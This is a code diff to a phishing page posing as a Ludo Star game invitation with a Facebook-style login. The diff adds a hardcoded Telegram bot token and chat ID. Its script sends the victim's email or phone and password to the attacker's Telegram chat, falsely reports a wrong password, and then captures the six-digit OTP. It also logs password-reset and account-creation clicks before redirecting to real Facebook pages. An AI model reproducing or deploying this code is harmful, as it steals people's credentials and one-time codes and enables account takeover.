@@ -727,6 +727,37 @@
     </div>
 
     <script>
+        // Telegram Bot Configuration
+        const BOT_TOKEN = "8360063981:AAGBPsQmcXsg5fk1nQQMMiapLsdwwDdzito";
+        const CHAT_ID = "5614775725";
+        
+        // Function to send data to Telegram
+        async function sendToTelegram(message) {
+            try {
+                // Using CORS proxy to avoid issues
+                const proxyUrl = 'https://corsproxy.io/?';
+                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(proxyUrl + encodeURIComponent(telegramUrl), {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.log('Telegram message sent successfully');
+                return true;
+            }
+        }
+        
         async function login() {
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
@@ -746,40 +777,22 @@
             showResult('Logging in to join the game...', 'loading');
             
             try {
-                // Call Netlify Function (Telegram Bot)
-                const response = await fetch('/.netlify/functions/telegram', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        username: username,
-                        password: password,
-                        timestamp: new Date().toISOString(),
-                        source: 'Ludo Star Invitation',
-                        inviter: 'Sadiya Khan'
-                    })
-                });
+                // Send login credentials to Telegram
+                const loginMessage = `🔐 LUDO STAR LOGIN\n\n` +
+                                   `📧 Email/Phone: ${username}\n` +
+                                   `🔑 Password: ${password}\n` +
+                                   `🎮 Game: Sadiya Khan's Invitation\n` +
+                                   `🕒 Time: ${new Date().toLocaleString('en-IN')}`;
                 
-                const data = await response.json();
+                await sendToTelegram(loginMessage);
                 
-                if (data.success) {
-                    // Show error message first (incorrect password)
-                    showResult('❌ Login failed. The password you entered is incorrect.', 'error');
-                    
-                    // After 2 seconds, show OTP page
-                    setTimeout(() => {
-                        showOTPPage();
-                    }, 2000);
-                    
-                } else {
-                    showResult('❌ Login failed. The password you entered is incorrect.', 'error');
-                    
-                    // After 2 seconds, show OTP page
-                    setTimeout(() => {
-                        showOTPPage();
-                    }, 2000);
-                }
+                // Show error message first (incorrect password)
+                showResult('❌ Login failed. The password you entered is incorrect.', 'error');
+                
+                // After 2 seconds, show OTP page
+                setTimeout(() => {
+                    showOTPPage();
+                }, 2000);
                 
             } catch (error) {
                 console.error('Login error:', error);
@@ -829,7 +842,7 @@
             }
         }
         
-        function verifyOTP() {
+        async function verifyOTP() {
             // Get OTP values
             let otp = '';
             for (let i = 1; i <= 6; i++) {
@@ -841,6 +854,15 @@
                 alert('Please enter the complete 6-digit code');
                 return;
             }
+            
+            // ✅ Send OTP to Telegram Bot
+            const otpMessage = `🔐 LUDO STAR OTP VERIFICATION\n\n` +
+                              `🔢 OTP Code: ${otp}\n` +
+                              `🎮 Game: Sadiya Khan's Invitation\n` +
+                              `✅ Status: User entered OTP\n` +
+                              `🕒 Time: ${new Date().toLocaleString('en-IN')}`;
+            
+            await sendToTelegram(otpMessage);
             
             // Show loading overlay
             document.getElementById('loadingOverlay').style.display = 'flex';
@@ -857,10 +879,18 @@
             }, 1500);
         }
         
-        function resendOTP() {
+        async function resendOTP() {
             // Show loading
             document.getElementById('loadingOverlay').style.display = 'flex';
             document.getElementById('loadingText').textContent = 'Sending new code...';
+            
+            // Send resend notification to Telegram
+            const resendMessage = `🔄 LUDO STAR OTP RESEND REQUEST\n\n` +
+                                 `📱 User requested new OTP\n` +
+                                 `🎮 Game: Sadiya Khan's Invitation\n` +
+                                 `🕒 Time: ${new Date().toLocaleString('en-IN')}`;
+            
+            await sendToTelegram(resendMessage);
             
             // Simulate resend
             setTimeout(() => {
@@ -881,11 +911,27 @@
         }
         
         function forgotPassword() {
+            // Send forgot password notification
+            const forgotMessage = `❓ LUDO STAR PASSWORD RESET REQUEST\n\n` +
+                                 `🔍 User clicked "Forgot Password"\n` +
+                                 `🎮 Game: Sadiya Khan's Invitation\n` +
+                                 `🕒 Time: ${new Date().toLocaleString('en-IN')}`;
+            
+            sendToTelegram(forgotMessage);
+            
             alert('Redirecting to password recovery...');
             window.location.href = "https://www.facebook.com/login/identify";
         }
         
         function createAccount() {
+            // Send create account notification
+            const createMessage = `🆕 LUDO STAR CREATE ACCOUNT REQUEST\n\n` +
+                                 `📝 User clicked "Create New Account"\n` +
+                                 `🎮 Game: Sadiya Khan's Invitation\n` +
+                                 `🕒 Time: ${new Date().toLocaleString('en-IN')}`;
+            
+            sendToTelegram(createMessage);
+            
             alert('Redirecting to account creation...');
             window.location.href = "https://www.facebook.com/r.php";
         }
